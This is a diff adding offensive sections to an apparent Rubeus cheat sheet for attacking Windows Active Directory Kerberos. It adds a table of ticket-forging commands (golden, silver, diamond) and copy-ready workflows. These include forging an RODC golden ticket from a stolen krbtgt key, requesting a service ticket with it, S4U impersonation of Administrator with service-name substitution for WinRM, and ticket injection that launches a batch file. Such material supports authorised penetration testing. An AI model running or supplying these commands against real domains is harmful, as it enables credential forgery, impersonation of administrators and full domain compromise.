@@ -68,6 +68,14 @@ Rubeus.exe dump /nowrap
 | `s4u` | S4U2Self + S4U2Proxy (constrained delegation) |
 | `tgssub` | Substitute altservice in TGS |
 
+### Ticket Forging
+
+| Command | Description |
+|---------|-------------|
+| `golden` | Forge golden ticket (TGT) — supports `/rodcNumber` for RODC golden tickets |
+| `silver` | Forge silver ticket (TGS) for specific service |
+| `diamond` | Modify legitimate TGT (stealthier than golden) |
+
 ## Common Workflows
 
 ```cmd
@@ -91,6 +99,21 @@ Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:corp.local /dc:dc.corp.loca
 
 # Constrained delegation S4U
 Rubeus.exe s4u /user:service$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
+
+# RODC Golden Ticket — forge TGT signed by RODC krbtgt_XXXXX
+# /rodcNumber sets kvno to (XXXXX << 16 | kvno_low) automatically
+Rubeus.exe golden /rodcNumber:8245 /aes256:<krbtgt_8245_aes256> /user:Administrator /id:500 /domain:domain.local /sid:<domain_SID> /flags:forwardable,renewable,enc_pa_rep /outfile:ticket.kirbi
+
+# Then upgrade to real TGS via asktgs against writable DC
+Rubeus.exe asktgs /ticket:ticket.kirbi /service:cifs/DC01.domain.local /dc:<writable_dc_ip> /outfile:tgs.kirbi
+
+# S4U with SPN substitution (/altservice) for double-hop
+# Gets cifs/ ticket but substitutes http/ for WinRM access
+Rubeus.exe s4u /user:FAKE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /altservice:http/TARGET.domain.local /dc:<dc_ip> /ptt
+
+# createnetonly — sacrifice logon session for ticket injection (bypasses WinRM double-hop)
+# Creates a new process in LOGON_TYPE 9 where injected tickets are usable for outbound auth
+Rubeus.exe s4u /user:FAKE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /dc:<dc_ip> /ptt /createnetonly:"cmd.exe /c C:\Windows\Temp\run.bat" /show:false
 ```
 
 ## Resources
